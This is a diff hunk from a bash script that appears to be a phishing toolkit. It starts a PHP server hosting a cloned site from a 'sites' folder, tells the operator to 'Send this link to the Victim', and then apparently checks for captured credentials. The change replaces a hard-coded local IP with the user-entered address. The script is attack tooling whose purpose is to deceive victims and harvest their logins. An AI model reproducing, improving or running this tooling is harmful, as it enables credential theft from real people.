@@ -381,7 +381,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Put your local IP (Default %s): " $default_ip
 read ip
 ip="${ip:-${default_ip}}"
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 192.168.1.19:80 > /dev/null 2>&1 & 
+cd sites/$server && php -S $ip:80 > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
 checkfound
